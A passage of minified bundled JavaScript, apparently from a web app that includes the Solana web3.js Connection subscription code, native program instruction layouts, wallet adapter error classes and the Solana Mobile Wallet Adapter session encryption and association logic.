this._rpcWebSocket.notify("ping")}catch{}})()},5e3),this._updateSubscriptions()}_wsOnError(e){this._rpcWebSocketConnected=!1,console.error("ws error:",e.message)}_wsOnClose(e){if(this._rpcWebSocketConnected=!1,this._rpcWebSocketGeneration=(this._rpcWebSocketGeneration+1)%Number.MAX_SAFE_INTEGER,this._rpcWebSocketIdleTimeout&&(clearTimeout(this._rpcWebSocketIdleTimeout),this._rpcWebSocketIdleTimeout=null),this._rpcWebSocketHeartbeat&&(clearInterval(this._rpcWebSocketHeartbeat),this._rpcWebSocketHeartbeat=null),e===1e3){this._updateSubscriptions();return}this._subscriptionCallbacksByServerSubscriptionId={},Object.entries(this._subscriptionsByHash).forEach(([t,r])=>{this._setSubscription(t,{...r,state:"pending"})})}_setSubscription(e,t){var i;const r=(i=this._subscriptionsByHash[e])==null?void 0:i.state;if(this._subscriptionsByHash[e]=t,r!==t.state){const s=this._subscriptionStateChangeCallbacksByHash[e];s&&s.forEach(o=>{try{o(t.state)}catch{}})}}_onSubscriptionStateChange(e,t){var s;const r=this._subscriptionHashByClientSubscriptionId[e];if(r==null)return()=>{};const i=(s=this._subscriptionStateChangeCallbacksByHash)[r]||(s[r]=new Set);return i.add(t),()=>{i.delete(t),i.size===0&&delete this._subscriptionStateChangeCallbacksByHash[r]}}async _updateSubscriptions(){if(Object.keys(this._subscriptionsByHash).length===0){this._rpcWebSocketConnected&&(this._rpcWebSocketConnected=!1,this._rpcWebSocketIdleTimeout=setTimeout(()=>{this._rpcWebSocketIdleTimeout=null;try{this._rpcWebSocket.close()}catch(r){r instanceof Error&&console.log(`Error when closing socket connection: ${r.message}`)}},500));return}if(this._rpcWebSocketIdleTimeout!==null&&(clearTimeout(this._rpcWebSocketIdleTimeout),this._rpcWebSocketIdleTimeout=null,this._rpcWebSocketConnected=!0),!this._rpcWebSocketConnected){this._rpcWebSocket.connect();return}const e=this._rpcWebSocketGeneration,t=()=>e===this._rpcWebSocketGeneration;await Promise.all(Object.keys(this._subscriptionsByHash).map(async r=>{const i=this._subscriptionsByHash[r];if(i!==void 0)switch(i.state){case"pending":case"unsubscribed":if(i.callbacks.size===0){delete this._subscriptionsByHash[r],i.state==="unsubscribed"&&delete this._subscriptionCallbacksByServerSubscriptionId[i.serverSubscriptionId],await this._updateSubscriptions();return}await(async()=>{const{args:s,method:o}=i;try{this._setSubscription(r,{...i,state:"subscribing"});const a=await this._rpcWebSocket.call(o,s);this._setSubscription(r,{...i,serverSubscriptionId:a,state:"subscribed"}),this._subscriptionCallbacksByServerSubscriptionId[a]=i.callbacks,await this._updateSubscriptions()}catch(a){if(console.error(`Received ${a instanceof Error?"":"JSON-RPC "}error calling \`${o}\``,{args:s,error:a}),!t())return;this._setSubscription(r,{...i,state:"pending"}),await this._updateSubscriptions()}})();break;case"subscribed":i.callbacks.size===0&&await(async()=>{const{serverSubscriptionId:s,unsubscribeMethod:o}=i;if(this._subscriptionsAutoDisposedByRpc.has(s))this._subscriptionsAutoDisposedByRpc.delete(s);else{this._setSubscription(r,{...i,state:"unsubscribing"}),this._setSubscription(r,{...i,state:"unsubscribing"});try{await this._rpcWebSocket.call(o,[s])}catch(a){if(a instanceof Error&&console.error(`${o} error:`,a.message),!t())return;this._setSubscription(r,{...i,state:"subscribed"}),await this._updateSubscriptions();return}}this._setSubscription(r,{...i,state:"unsubscribed"}),await this._updateSubscriptions()})();break}}))}_handleServerNotification(e,t){const r=this._subscriptionCallbacksByServerSubscriptionId[e];r!==void 0&&r.forEach(i=>{try{i(...t)}catch(s){console.error(s)}})}_wsOnAccountNotification(e){const{result:t,subscription:r}=de(e,PO);this._handleServerNotification(r,[t.value,t.context])}_makeSubscription(e,t){const r=this._nextClientSubscriptionId++,i=wE([e.method,t]),s=this._subscriptionsByHash[i];return s===void 0?this._subscriptionsByHash[i]={...e,args:t,callbacks:new Set([e.callback]),state:"pending"}:s.callbacks.add(e.callback),this._subscriptionHashByClientSubscriptionId[r]=i,this._subscriptionDisposeFunctionsByClientSubscriptionId[r]=async()=>{delete this._subscriptionDisposeFunctionsByClientSubscriptionId[r],delete this._subscriptionHashByClientSubscriptionId[r];const o=this._subscriptionsByHash[i];Bt(o!==void 0,`Could not find a \`Subscription\` when tearing down client subscription #${r}`),o.callbacks.delete(e.callback),await this._updateSubscriptions()},this._updateSubscriptions(),r}onAccountChange(e,t,r){const{commitment:i,config:s}=St(r),o=this._buildArgs([e.toBase58()],i||this._commitment||"finalized","base64",s);return this._makeSubscription({callback:t,method:"accountSubscribe",unsubscribeMethod:"accountUnsubscribe"},o)}async removeAccountChangeListener(e){await this._unsubscribeClientSubscription(e,"account change")}_wsOnProgramAccountNotification(e){const{result:t,subscription:r}=de(e,DO);this._handleServerNotification(r,[{accountId:t.value.pubkey,accountInfo:t.value.account},t.context])}onProgramAccountChange(e,t,r,i){const{commitment:s,config:o}=St(r),a=this._buildArgs([e.toBase58()],s||this._commitment||"finalized","base64",o||(i?{filters:EE(i)}:void 0));return this._makeSubscription({callback:t,method:"programSubscribe",unsubscribeMethod:"programUnsubscribe"},a)}async removeProgramAccountChangeListener(e){await this._unsubscribeClientSubscription(e,"program account change")}onLogs(e,t,r){const i=this._buildArgs([typeof e=="object"?{mentions:[e.toString()]}:e],r||this._commitment||"finalized");return this._makeSubscription({callback:t,method:"logsSubscribe",unsubscribeMethod:"logsUnsubscribe"},i)}async removeOnLogsListener(e){await this._unsubscribeClientSubscription(e,"logs")}_wsOnLogsNotification(e){const{result:t,subscription:r}=de(e,h3);this._handleServerNotification(r,[t.value,t.context])}_wsOnSlotNotification(e){const{result:t,subscription:r}=de(e,BO);this._handleServerNotification(r,[t])}onSlotChange(e){return this._makeSubscription({callback:e,method:"slotSubscribe",unsubscribeMethod:"slotUnsubscribe"},[])}async removeSlotChangeListener(e){await this._unsubscribeClientSubscription(e,"slot change")}_wsOnSlotUpdatesNotification(e){const{result:t,subscription:r}=de(e,jO);this._handleServerNotification(r,[t])}onSlotUpdate(e){return this._makeSubscription({callback:e,method:"slotsUpdatesSubscribe",unsubscribeMethod:"slotsUpdatesUnsubscribe"},[])}async removeSlotUpdateListener(e){await this._unsubscribeClientSubscription(e,"slot update")}async _unsubscribeClientSubscription(e,t){const r=this._subscriptionDisposeFunctionsByClientSubscriptionId[e];r?await r():console.warn(`Ignored unsubscribe request because an active subscription with id \`${e}\` for '${t}' events could not be found.`)}_buildArgs(e,t,r,i){const s=t||this._commitment;if(s||r||i){let o={};r&&(o.encoding=r),s&&(o.commitment=s),i&&(o=Object.assign(o,i)),e.push(o)}return e}_buildArgsAtLeastConfirmed(e,t,r,i){const s=t||this._commitment;if(s&&!["confirmed","finalized"].includes(s))throw new Error("Using Connection with default commitment: `"+this._commitment+"`, but method requires at least `confirmed`");return this._buildArgs(e,t,r,i)}_wsOnSignatureNotification(e){const{result:t,subscription:r}=de(e,VO);t.value!=="receivedSignature"&&this._subscriptionsAutoDisposedByRpc.add(r),this._handleServerNotification(r,t.value==="receivedSignature"?[{type:"received"},t.context]:[{type:"status",result:t.value},t.context])}onSignature(e,t,r){const i=this._buildArgs([e],r||this._commitment||"finalized"),s=this._makeSubscription({callback:(o,a)=>{if(o.type==="status"){t(o.result,a);try{this.removeSignatureListener(s)}catch{}}},method:"signatureSubscribe",unsubscribeMethod:"signatureUnsubscribe"},i);return s}onSignatureWithOptions(e,t,r){const{commitment:i,...s}={...r,commitment:r&&r.commitment||this._commitment||"finalized"},o=this._buildArgs([e],i,void 0,s),a=this._makeSubscription({callback:(l,u)=>{t(l,u);try{this.removeSignatureListener(a)}catch{}},method:"signatureSubscribe",unsubscribeMethod:"signatureUnsubscribe"},o);return a}async removeSignatureListener(e){await this._unsubscribeClientSubscription(e,"signature result")}_wsOnRootNotification(e){const{result:t,subscription:r}=de(e,FO);this._handleServerNotification(r,[t])}onRootChange(e){return this._makeSubscription({callback:e,method:"rootSubscribe",unsubscribeMethod:"rootUnsubscribe"},[])}async removeRootChangeListener(e){await this._unsubscribeClientSubscription(e,"root change")}}Object.freeze({CreateLookupTable:{index:0,layout:ve([Ae("instruction"),Cl("recentSlot"),it("bumpSeed")])},FreezeLookupTable:{index:1,layout:ve([Ae("instruction")])},ExtendLookupTable:{index:2,layout:ve([Ae("instruction"),Cl(),er(He(),Qo(Ae(),-8),"addresses")])},DeactivateLookupTable:{index:3,layout:ve([Ae("instruction")])},CloseLookupTable:{index:4,layout:ve([Ae("instruction")])}});new Ie("AddressLookupTab1e1111111111111111111111111");Object.freeze({RequestUnits:{index:0,layout:ve([it("instruction"),Ae("units"),Ae("additionalFee")])},RequestHeapFrame:{index:1,layout:ve([it("instruction"),Ae("bytes")])},SetComputeUnitLimit:{index:2,layout:ve([it("instruction"),Ae("units")])},SetComputeUnitPrice:{index:3,layout:ve([it("instruction"),Cl("microLamports")])}});new Ie("ComputeBudget111111111111111111111111111111");ve([it("numSignatures"),it("padding"),Vr("signatureOffset"),Vr("signatureInstructionIndex"),Vr("publicKeyOffset"),Vr("publicKeyInstructionIndex"),Vr("messageDataOffset"),Vr("messageDataSize"),Vr("messageInstructionIndex")]);new Ie("Ed25519SigVerify111111111111111111111111111");ED.utils.isValidPrivateKey;ve([it("numSignatures"),Vr("signatureOffset"),it("signatureInstructionIndex"),Vr("ethAddressOffset"),it("ethAddressInstructionIndex"),Vr("messageDataOffset"),Vr("messageDataSize"),it("messageInstructionIndex"),Rt(20,"ethAddress"),Rt(64,"signature"),it("recoveryId")]);new Ie("KeccakSecp256k11111111111111111111111111111");var ax;new Ie("StakeConfig11111111111111111111111111111111");class lx{constructor(e,t,r){this.unixTimestamp=void 0,this.epoch=void 0,this.custodian=void 0,this.unixTimestamp=e,this.epoch=t,this.custodian=r}}ax=lx;lx.default=new ax(0,0,Ie.default);Object.freeze({Initialize:{index:0,layout:ve([Ae("instruction"),xD(),kD()])},Authorize:{index:1,layout:ve([Ae("instruction"),He("newAuthorized"),Ae("stakeAuthorizationType")])},Delegate:{index:2,layout:ve([Ae("instruction")])},Split:{index:3,layout:ve([Ae("instruction"),Sr("lamports")])},Withdraw:{index:4,layout:ve([Ae("instruction"),Sr("lamports")])},Deactivate:{index:5,layout:ve([Ae("instruction")])},Merge:{index:7,layout:ve([Ae("instruction")])},AuthorizeWithSeed:{index:8,layout:ve([Ae("instruction"),He("newAuthorized"),Ae("stakeAuthorizationType"),nl("authoritySeed"),He("authorityOwner")])}});new Ie("Stake11111111111111111111111111111111111111");Object.freeze({InitializeAccount:{index:0,layout:ve([Ae("instruction"),CD()])},Authorize:{index:1,layout:ve([Ae("instruction"),He("newAuthorized"),Ae("voteAuthorizationType")])},Withdraw:{index:3,layout:ve([Ae("instruction"),Sr("lamports")])},UpdateValidatorIdentity:{index:4,layout:ve([Ae("instruction")])},AuthorizeWithSeed:{index:10,layout:ve([Ae("instruction"),RD()])}});new Ie("Vote111111111111111111111111111111111111111");new Ie("Va1idator1nfo111111111111111111111111111111");se({name:ue(),website:be(ue()),details:be(ue()),iconUrl:be(ue()),keybaseUsername:be(ue())});new Ie("Vote111111111111111111111111111111111111111");ve([He("nodePubkey"),He("authorizedWithdrawer"),it("commission"),Rn(),er(ve([Rn("slot"),Ae("confirmationCount")]),Qo(Ae(),-8),"votes"),it("rootSlotValid"),Rn("rootSlot"),Rn(),er(ve([Rn("epoch"),He("authorizedVoter")]),Qo(Ae(),-8),"authorizedVoters"),ve([er(ve([He("authorizedPubkey"),Rn("epochOfLastAuthorizedSwitch"),Rn("targetEpoch")]),32,"buf"),Rn("idx"),it("isEmpty")],"priorVoters"),Rn(),er(ve([Rn("epoch"),Rn("credits"),Rn("prevCredits")]),Qo(Ae(),-8),"epochCredits"),ve([Rn("slot"),Rn("timestamp")],"lastTimestamp")]);const cx=Y.createContext({});function d3(){return Y.useContext(cx)}const p3=({children:n,endpoint:e,config:t={commitment:"confirmed"}})=>{const r=Y.useMemo(()=>new Xw(e,t),[e,t]);return ce.createElement(cx.Provider,{value:{connection:r}},n)};var ux={exports:{}};(function(n){var e=Object.prototype.hasOwnProperty,t="~";function r(){}Object.create&&(r.prototype=Object.create(null),new r().__proto__||(t=!1));function i(l,u,h){this.fn=l,this.context=u,this.once=h||!1}function s(l,u,h,f,m){if(typeof h!="function")throw new TypeError("The listener must be a function");var v=new i(h,f||l,m),x=t?t+u:u;return l._events[x]?l._events[x].fn?l._events[x]=[l._events[x],v]:l._events[x].push(v):(l._events[x]=v,l._eventsCount++),l}function o(l,u){--l._eventsCount===0?l._events=new r:delete l._events[u]}function a(){this._events=new r,this._eventsCount=0}a.prototype.eventNames=function(){var u=[],h,f;if(this._eventsCount===0)return u;for(f in h=this._events)e.call(h,f)&&u.push(t?f.slice(1):f);return Object.getOwnPropertySymbols?u.concat(Object.getOwnPropertySymbols(h)):u},a.prototype.listeners=function(u){var h=t?t+u:u,f=this._events[h];if(!f)return[];if(f.fn)return[f.fn];for(var m=0,v=f.length,x=new Array(v);m<v;m++)x[m]=f[m].fn;return x},a.prototype.listenerCount=function(u){var h=t?t+u:u,f=this._events[h];return f?f.fn?1:f.length:0},a.prototype.emit=function(u,h,f,m,v,x){var k=t?t+u:u;if(!this._events[k])return!1;var I=this._events[k],S=arguments.length,b,E;if(I.fn){switch(I.once&&this.removeListener(u,I.fn,void 0,!0),S){case 1:return I.fn.call(I.context),!0;case 2:return I.fn.call(I.context,h),!0;case 3:return I.fn.call(I.context,h,f),!0;case 4:return I.fn.call(I.context,h,f,m),!0;case 5:return I.fn.call(I.context,h,f,m,v),!0;case 6:return I.fn.call(I.context,h,f,m,v,x),!0}for(E=1,b=new Array(S-1);E<S;E++)b[E-1]=arguments[E];I.fn.apply(I.context,b)}else{var U=I.length,H;for(E=0;E<U;E++)switch(I[E].once&&this.removeListener(u,I[E].fn,void 0,!0),S){case 1:I[E].fn.call(I[E].context);break;case 2:I[E].fn.call(I[E].context,h);break;case 3:I[E].fn.call(I[E].context,h,f);break;case 4:I[E].fn.call(I[E].context,h,f,m);break;default:if(!b)for(H=1,b=new Array(S-1);H<S;H++)b[H-1]=arguments[H];I[E].fn.apply(I[E].context,b)}}return!0},a.prototype.on=function(u,h,f){return s(this,u,h,f,!1)},a.prototype.once=function(u,h,f){return s(this,u,h,f,!0)},a.prototype.removeListener=function(u,h,f,m){var v=t?t+u:u;if(!this._events[v])return this;if(!h)return o(this,v),this;var x=this._events[v];if(x.fn)x.fn===h&&(!m||x.once)&&(!f||x.context===f)&&o(this,v);else{for(var k=0,I=[],S=x.length;k<S;k++)(x[k].fn!==h||m&&!x[k].once||f&&x[k].context!==f)&&I.push(x[k]);I.length?this._events[v]=I.length===1?I[0]:I:o(this,v)}return this},a.prototype.removeAllListeners=function(u){var h;return u?(h=t?t+u:u,this._events[h]&&o(this,h)):(this._events=new r,this._eventsCount=0),this},a.prototype.off=a.prototype.removeListener,a.prototype.addListener=a.prototype.on,a.prefixed=t,a.EventEmitter=a,n.exports=a})(ux);var g3=ux.exports;const m3=ca(g3);class xn extends Error{constructor(e,t){super(e),this.error=t}}class Xs extends xn{constructor(){super(...arguments),this.name="WalletNotReadyError"}}class y3 extends xn{constructor(){super(...arguments),this.name="WalletLoadError"}}class rl extends xn{constructor(){super(...arguments),this.name="WalletConfigError"}}class Vs extends xn{constructor(){super(...arguments),this.name="WalletConnectionError"}}class xp extends xn{constructor(){super(...arguments),this.name="WalletDisconnectedError"}}class ev extends xn{constructor(){super(...arguments),this.name="WalletDisconnectionError"}}class Vo extends xn{constructor(){super(...arguments),this.name="WalletAccountError"}}class Rl extends xn{constructor(){super(...arguments),this.name="WalletPublicKeyError"}}class sn extends xn{constructor(){super(...arguments),this.name="WalletNotConnectedError"}}class Yi extends xn{constructor(){super(...arguments),this.name="WalletSendTransactionError"}}class si extends xn{constructor(){super(...arguments),this.name="WalletSignTransactionError"}}class kp extends xn{constructor(){super(...arguments),this.name="WalletSignMessageError"}}class AE extends xn{constructor(){super(...arguments),this.name="WalletSignInError"}}var Ve;(function(n){n.Installed="Installed",n.NotDetected="NotDetected",n.Loadable="Loadable",n.Unsupported="Unsupported"})(Ve||(Ve={}));class hx extends m3{get connected(){return!!this.publicKey}async autoConnect(){await this.connect()}async prepareTransaction(e,t,r={}){const i=this.publicKey;if(!i)throw new sn;return e.feePayer=e.feePayer||i,e.recentBlockhash=e.recentBlockhash||(await t.getLatestBlockhash({commitment:r.preflightCommitment,minContextSlot:r.minContextSlot})).blockhash,e}}function fx(n){if(typeof window>"u"||typeof document>"u")return;const e=[];function t(){if(n())for(const s of e)s()}const r=setInterval(t,1e3);e.push(()=>clearInterval(r)),document.readyState==="loading"&&(document.addEventListener("DOMContentLoaded",t,{once:!0}),e.push(()=>document.removeEventListener("DOMContentLoaded",t))),document.readyState!=="complete"&&(window.addEventListener("load",t,{once:!0}),e.push(()=>window.removeEventListener("load",t))),t()}function B0(){if(!navigator)return!1;const n=navigator.userAgent.toLowerCase(),e=n.includes("iphone")||n.includes("ipad"),t=n.includes("safari");return e&&t}function Zi(n){return"version"in n}class w3 extends hx{async sendTransaction(e,t,r={}){let i=!0;try{if(Zi(e)){if(!this.supportedTransactionVersions)throw new Yi("Sending versioned transactions isn't supported by this wallet");if(!this.supportedTransactionVersions.has(e.version))throw new Yi(`Sending transaction version ${e.version} isn't supported by this wallet`);try{e=await this.signTransaction(e);const s=e.serialize();return await t.sendRawTransaction(s,r)}catch(s){throw s instanceof si?(i=!1,s):new Yi(s==null?void 0:s.message,s)}}else try{const{signers:s,...o}=r;e=await this.prepareTransaction(e,t,o),s!=null&&s.length&&e.partialSign(...s),e=await this.signTransaction(e);const a=e.serialize();return await t.sendRawTransaction(a,o)}catch(s){throw s instanceof si?(i=!1,s):new Yi(s==null?void 0:s.message,s)}}catch(s){throw i&&this.emit("error",s),s}}async signAllTransactions(e){for(const r of e)if(Zi(r)){if(!this.supportedTransactionVersions)throw new si("Signing versioned transactions isn't supported by this wallet");if(!this.supportedTransactionVersions.has(r.version))throw new si(`Signing transaction version ${r.version} isn't supported by this wallet`)}const t=[];for(const r of e)t.push(await this.signTransaction(r));return t}}class tv extends w3{}class v3 extends tv{}const Ki="solana:signAndSendTransaction",rm="solana:signIn",Ua="solana:signMessage",En="solana:signTransaction",nv="standard:connect",U0="standard:disconnect",rv="standard:events";function _3(n){return nv in n.features&&rv in n.features&&(Ki in n.features||En in n.features)}class bE extends xn{constructor(){super(...arguments),this.name="WalletNotSelectedError"}}const E3=[],Cp={autoConnect:!1,connecting:!1,connected:!1,disconnecting:!1,select(){ti("call","select")},connect(){return Promise.reject(ti("call","connect"))},disconnect(){return Promise.reject(ti("call","disconnect"))},sendTransaction(){return Promise.reject(ti("call","sendTransaction"))},signTransaction(){return Promise.reject(ti("call","signTransaction"))},signAllTransactions(){return Promise.reject(ti("call","signAllTransactions"))},signMessage(){return Promise.reject(ti("call","signMessage"))},signIn(){return Promise.reject(ti("call","signIn"))}};Object.defineProperty(Cp,"wallets",{get(){return ti("read","wallets"),E3}});Object.defineProperty(Cp,"wallet",{get(){return ti("read","wallet"),null}});Object.defineProperty(Cp,"publicKey",{get(){return ti("read","publicKey"),null}});function ti(n,e){const t=new Error(`You have tried to ${n} "${e}" on a WalletContext without providing one. Make sure to render a WalletProvider as an ancestor of the component that uses WalletContext.`);return console.error(t),t}const dx=Y.createContext(Cp);function px(){return Y.useContext(dx)}function I3(n,e){const t=Y.useState(()=>{try{const s=localStorage.getItem(n);if(s)return JSON.parse(s)}catch(s){typeof window<"u"&&console.error(s)}return e}),r=t[0],i=Y.useRef(!0);return Y.useEffect(()=>{if(i.current){i.current=!1;return}try{r===null?localStorage.removeItem(n):localStorage.setItem(n,JSON.stringify(r))}catch(s){typeof window<"u"&&console.error(s)}},[r,n]),t}function im(n){switch(n){case"processed":case"confirmed":case"finalized":case void 0:return n;case"recent":return"processed";case"single":case"singleGossip":return"confirmed";case"max":case"root":return"finalized";default:return}}const j0="solana:mainnet",gx="solana:devnet",mx="solana:testnet",S3="solana:localnet",T3="https://api.mainnet-beta.solana.com";function A3(n){return n.includes(T3)?j0:/\bdevnet\b/i.test(n)?gx:/\btestnet\b/i.test(n)?mx:/\blocalhost\b/i.test(n)||/\b127\.0\.0\.1\b/.test(n)?S3:j0}function b3(n){let e=`${n.domain} wants you to sign in with your Solana account:
`;e+=`${n.address}`,n.statement&&(e+=`

${n.statement}`);const t=[];if(n.uri&&t.push(`URI: ${n.uri}`),n.version&&t.push(`Version: ${n.version}`),n.chainId&&t.push(`Chain ID: ${n.chainId}`),n.nonce&&t.push(`Nonce: ${n.nonce}`),n.issuedAt&&t.push(`Issued At: ${n.issuedAt}`),n.expirationTime&&t.push(`Expiration Time: ${n.expirationTime}`),n.notBefore&&t.push(`Not Before: ${n.notBefore}`),n.requestId&&t.push(`Request ID: ${n.requestId}`),n.resources){t.push("Resources:");for(const r of n.resources)t.push(`- ${r}`)}return t.length&&(e+=`

${t.join(`
`)}`),e}const ls={ERROR_ASSOCIATION_PORT_OUT_OF_RANGE:"ERROR_ASSOCIATION_PORT_OUT_OF_RANGE",ERROR_REFLECTOR_ID_OUT_OF_RANGE:"ERROR_REFLECTOR_ID_OUT_OF_RANGE",ERROR_FORBIDDEN_WALLET_BASE_URL:"ERROR_FORBIDDEN_WALLET_BASE_URL",ERROR_SECURE_CONTEXT_REQUIRED:"ERROR_SECURE_CONTEXT_REQUIRED",ERROR_SESSION_CLOSED:"ERROR_SESSION_CLOSED",ERROR_SESSION_TIMEOUT:"ERROR_SESSION_TIMEOUT",ERROR_WALLET_NOT_FOUND:"ERROR_WALLET_NOT_FOUND",ERROR_INVALID_PROTOCOL_VERSION:"ERROR_INVALID_PROTOCOL_VERSION"};class cs extends Error{constructor(...e){const[t,r,i]=e;super(r),this.code=t,this.data=i,this.name="SolanaMobileWalletAdapterError"}}class yx extends Error{constructor(...e){const[t,r,i,s]=e;super(i),this.code=r,this.data=s,this.jsonRpcMessageId=t,this.name="SolanaMobileWalletAdapterProtocolError"}}function un(n,e,t,r){function i(s){return s instanceof t?s:new t(function(o){o(s)})}return new(t||(t=Promise))(function(s,o){function a(h){try{u(r.next(h))}catch(f){o(f)}}function l(h){try{u(r.throw(h))}catch(f){o(f)}}function u(h){h.done?s(h.value):i(h.value).then(a,l)}u((r=r.apply(n,e||[])).next())})}function sm(n,e){return un(this,void 0,void 0,function*(){const t=yield crypto.subtle.exportKey("raw",n),r=yield crypto.subtle.sign({hash:"SHA-256",name:"ECDSA"},e,t),i=new Uint8Array(t.byteLength+r.byteLength);return i.set(new Uint8Array(t),0),i.set(new Uint8Array(r),t.byteLength),i})}function x3(n){return window.btoa(n)}function k3(n){return b3(n)}function C3(n){return x3(k3(n))}const R3="solana:signTransactions",xE="solana:cloneAuthorization";function M3(n,e){return new Proxy({},{get(t,r){return t[r]==null&&(t[r]=function(i){return un(this,void 0,void 0,function*(){const{method:s,params:o}=N3(r,i,n),a=yield e(s,o);return s==="authorize"&&o.sign_in_payload&&!a.sign_in_result&&(a.sign_in_result=yield L3(o.sign_in_payload,a,e)),P3(r,a,n)})}),t[r]},defineProperty(){return!1},deleteProperty(){return!1}})}function N3(n,e,t){let r=e,i=n.toString().replace(/[A-Z]/g,s=>`_${s.toLowerCase()}`).toLowerCase();switch(n){case"authorize":{let{chain:s}=r;if(t==="legacy"){switch(s){case"solana:testnet":{s="testnet";break}case"solana:devnet":{s="devnet";break}case"solana:mainnet":{s="mainnet-beta";break}default:s=r.cluster}r.cluster=s}else{switch(s){case"testnet":case"devnet":{s=`solana:${s}`;break}case"mainnet-beta":{s="solana:mainnet";break}}r.chain=s}}case"reauthorize":{const{auth_token:s,identity:o}=r;if(s)switch(t){case"legacy":{i="reauthorize",r={auth_token:s,identity:o};break}default:{i="authorize";break}}break}}return{method:i,params:r}}function P3(n,e,t){switch(n){case"getCapabilities":{const r=e;switch(t){case"legacy":{const i=[R3];return r.supports_clone_authorization===!0&&i.push(xE),Object.assign(Object.assign({},r),{features:i})}case"v1":return Object.assign(Object.assign({},r),{supports_sign_and_send_transactions:!0,supports_clone_authorization:r.features.includes(xE)})}}}return e}function L3(n,e,t){var r;return un(this,void 0,void 0,function*(){const i=(r=n.domain)!==null&&r!==void 0?r:window.location.host,s=e.accounts[0].address,o=C3(Object.assign(Object.assign({},n),{domain:i,address:s})),a=yield t("sign_messages",{addresses:[s],payloads:[o]});return{address:s,signed_message:o,signature:a.signed_payloads[0].slice(o.length)}})}const Fo=4;function D3(n){if(n>=4294967296)throw new Error("Outbound sequence number overflow. The maximum sequence number is 32-bytes.");const e=new ArrayBuffer(Fo);return new DataView(e).setUint32(0,n,!1),new Uint8Array(e)}const V0=12,wx=65;function O3(n,e,t){return un(this,void 0,void 0,function*(){const r=D3(e),i=new Uint8Array(V0);crypto.getRandomValues(i);const s=yield crypto.subtle.encrypt(_x(r,i),t,new TextEncoder().encode(n)),o=new Uint8Array(r.byteLength+i.byteLength+s.byteLength);return o.set(new Uint8Array(r),0),o.set(new Uint8Array(i),r.byteLength),o.set(new Uint8Array(s),r.byteLength+i.byteLength),o})}function vx(n,e){return un(this,void 0,void 0,function*(){const t=n.slice(0,Fo),r=n.slice(Fo,Fo+V0),i=n.slice(Fo+V0),s=yield crypto.subtle.decrypt(_x(t,r),e,i);return B3().decode(s)})}function _x(n,e){return{additionalData:n,iv:e,name:"AES-GCM",tagLength:128}}let om;function B3(){return om===void 0&&(om=new TextDecoder("utf-8")),om}function U3(){return un(this,void 0,void 0,function*(){return yield crypto.subtle.generateKey({name:"ECDSA",namedCurve:"P-256"},!1,["sign"])})}function am(){return un(this,void 0,void 0,function*(){return yield crypto.subtle.generateKey({name:"ECDH",namedCurve:"P-256"},!1,["deriveKey","deriveBits"])})}function j3(n,e){return un(this,void 0,void 0,function*(){const t=JSON.stringify(n),r=n.id;return O3(t,r,e)})}function V3(n,e){return un(this,void 0,void 0,function*(){const t=yield vx(n,e),r=JSON.parse(t);if(Object.hasOwnProperty.call(r,"error"))throw new yx(r.id,r.error.code,r.error.message);return r})}function F3(n,e,t){return un(this,void 0,void 0,function*(){const[r,i]=yield Promise.all([crypto.subtle.exportKey("raw",e),crypto.subtle.importKey("raw",n.slice(0,wx),{name:"ECDH",namedCurve:"P-256"},!1,[])]),s=yield crypto.subtle.deriveBits({name:"ECDH",public:i},t,256),o=yield crypto.subtle.importKey("raw",s,"HKDF",!1,["deriveKey"]);return yield crypto.subtle.deriveKey({name:"HKDF",hash:"SHA-256",salt:new Uint8Array(r),info:new Uint8Array},o,{name:"AES-GCM",length:128},!1,["encrypt","decrypt"])})}function z3(n,e){return un(this,void 0,void 0,function*(){const t=yield vx(n,e),r=JSON.parse(t);let i="legacy";if(Object.hasOwnProperty.call(r,"v"))switch(r.v){case 1:case"1":case"v1":i="v1";break;case"legacy":i="legacy";break;default:throw new cs(ls.ERROR_INVALID_PROTOCOL_VERSION,`Unknown/unsupported protocol version: ${r.v}`)}return{protocol_version:i}})}function W3(){return Ex(49152+Math.floor(Math.random()*(65535-49152+1)))}function Ex(n){if(n<49152||n>65535)throw new cs(ls.ERROR_ASSOCIATION_PORT_OUT_OF_RANGE,`Association port number must be between 49152 and 65535. ${n} given.`,{port:n});return n}function $3(n){let e="";const t=new Uint8Array(n),r=t.byteLength;for(let i=0;i<r;i++)e+=String.fromCharCode(t[i]);return window.btoa(e)}function H3(n){return n.replace(/[/+=]/g,e=>({"/":"_","+":"-","=":"."})[e])}const q3="solana-wallet";function kE(n){return n.replace(/(^\/+|\/+$)/g,"").split("/")}function K3(n,e){let t=null;if(e){try{t=new URL(e)}catch{}if((t==null?void 0:t.protocol)!=="https:")throw new cs(ls.ERROR_FORBIDDEN_WALLET_BASE_URL,"Base URLs supplied by wallets must be valid `https` URLs")}t||(t=new URL(`${q3}:/`));const r=n.startsWith("/")?n:[...kE(t.pathname),...kE(n)].join("/");return new URL(r,t)}function G3(n,e,t,r=["v1"]){return un(this,void 0,void 0,function*(){const i=Ex(e),s=yield crypto.subtle.exportKey("raw",n),o=$3(s),a=K3("v1/associate/local",t);return a.searchParams.set("association",H3(o)),a.searchParams.set("port",`${i}`),r.forEach(l=>{a.searchParams.set("v",l)}),a})}const Ed={Firefox:0,Other:1};function Q3(){return navigator.userAgent.indexOf("Firefox/")!==-1?Ed.Firefox:Ed.Other}function Y3(){return new Promise((n,e)=>{function t(){clearTimeout(i),window.removeEventListener("blur",r)}function r(){t(),n()}window.addEventListener("blur",r);const i=setTimeout(()=>{t(),e()},2e3)})}let Nc=null;function Z3(n){Nc==null&&(Nc=document.createElement("iframe"),Nc.style.display="none",document.body.appendChild(Nc)),Nc.contentWindow.location.href=n.toString()}function J3(n){return un(this,void 0,void 0,function*(){if(n.protocol==="https:")window.location.assign(n);else try{const e=Q3();switch(e){case Ed.Firefox:Z3(n);break;case Ed.Other:{const t=Y3();window.location.assign(n),yield t;break}default:}}catch{throw new cs(ls.ERROR_WALLET_NOT_FOUND,"Found no installed wallet that supports the mobile wallet protocol.")}})}function X3(n,e){return un(this,void 0,void 0,function*(){const t=W3(),r=yield G3(n,t,e);return yield J3(r),t})}const CE={retryDelayScheduleMs:[150,150,200,500,500,750,750,1e3],timeoutMs:3e4},eB="com.solana.mobilewalletadapter.v1";function tB(){if(typeof window>"u"||window.isSecureContext!==!0)throw new cs(ls.ERROR_SECURE_CONTEXT_REQUIRED,"The mobile wallet adapter protocol must be used in a secure context (`https`).")}function nB(n){let e;try{e=new URL(n)}catch{throw new cs(ls.ERROR_FORBIDDEN_WALLET_BASE_URL,"Invalid base URL supplied by wallet")}if(e.protocol!=="https:")throw new cs(ls.ERROR_FORBIDDEN_WALLET_BASE_URL,"Base URLs supplied by wallets must be valid `https` 